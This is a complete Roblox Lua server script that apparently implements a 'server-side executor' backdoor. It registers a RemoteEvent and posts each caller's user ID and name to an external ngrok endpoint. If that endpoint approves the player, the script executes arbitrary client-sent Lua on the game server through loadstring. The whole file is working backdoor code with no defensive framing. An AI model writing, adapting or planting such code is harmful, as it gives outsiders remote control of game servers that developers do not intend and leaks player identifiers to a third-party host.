-- Val Private SS: Dynamic Ngrok Whitelist
local HttpService = game:GetService("HttpService")
local RemoteName = "ValRemote_v1"
local NgrokURL = "https://subventionary-letha-boughten.ngrok-free.dev/check"

local Remote = Instance.new("RemoteEvent")
Remote.Name = RemoteName
Remote.Parent = game.ReplicatedStorage

Remote.OnServerEvent:Connect(function(player, code)
    -- 1. Ask the Ngrok Server if this UserID is whitelisted
    local success, response = pcall(function()
        return HttpService:JSONEncode({
            userId = player.UserId,
            username = player.Name
        })
    end)

    if success then
        local check = pcall(function()
            local result = HttpService:PostAsync(NgrokURL, response, Enum.HttpContentType.ApplicationJson)
            local data = HttpService:JSONDecode(result)
            
            if data.whitelisted == true then
                -- 2. If whitelisted, run the code
                local func = loadstring(code)
                if func then task.spawn(func) end
            else
                warn("Val SS: Access Denied for " .. player.Name)
            end
        end)
    end
end)
